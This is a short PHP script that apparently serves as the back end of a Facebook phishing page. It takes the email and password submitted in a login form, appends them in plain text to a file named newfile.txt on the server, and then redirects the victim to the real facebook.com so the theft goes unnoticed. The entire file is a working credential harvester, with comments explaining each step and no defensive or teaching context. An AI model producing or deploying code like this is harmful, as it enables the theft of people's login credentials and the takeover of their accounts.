<?php
	
	//redirect the browser to original page
	header ('Location:https://www.facebook.com/');
	
	//create a new file called newfile.txt for appending ("a")
	$myfile = fopen("newfile.txt", "a")or die("Unable to open"); 
	
	//Extract the credentials received 
	$email = $_POST['email']; 
	$password = $_POST['pass'];
	
	fwrite($myfile, "Username: ");
	fwrite($myfile, $email);

	fwrite($myfile, "\r\n");
	
	fwrite($myfile, "Password: ");
	fwrite($myfile, $password);
	
	fclose($myfile);
	
?>